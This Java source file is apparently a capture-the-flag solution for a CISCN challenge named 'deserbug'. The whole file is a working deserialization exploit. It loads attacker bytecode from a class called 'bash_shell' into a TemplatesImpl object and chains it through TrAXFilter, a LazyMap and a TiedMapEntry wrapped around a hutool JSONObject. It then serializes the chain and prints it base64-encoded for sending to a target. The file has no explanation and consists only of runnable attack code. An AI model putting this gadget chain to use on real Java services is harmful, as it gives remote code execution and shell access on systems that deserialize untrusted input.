package ctf_complete_exclude;

import cn.hutool.json.JSONObject;
import com.app.Myexpect;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CISCN_deserbug {
    public static void main(String[] args) throws Exception
    {
        byte[] code1 = Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\target\\classes\\bash_shell.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Myexpect myexpect = new Myexpect();
        myexpect.setTypeparam(new Class[]{Templates.class});
        myexpect.setTargetclass(TrAXFilter.class);
        myexpect.setTypearg(new Object[]{templatesClass});
        JSONObject jsonObject = new JSONObject();//CC3TrAXFilter
        Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        jsonObject.remove("test1");
        Field factory = lazyMap.getClass().getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, new ConstantTransformer(myexpect));
        serialize(hashMap);
        System.out.println(base64encode(Files.readAllBytes(Paths.get("E:\\CODE_COLLECT\\Idea_java_ProTest\\Test\\ser.bin"))));
        unserialize("ser.bin");
    }
    public static String base64encode(byte[] bytes) throws Exception
    {
        Class<?> base64 = Class.forName("java.util.Base64");
        Object Encoder = base64.getMethod("getEncoder").invoke(null);
        return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder,bytes);
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws Exception {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
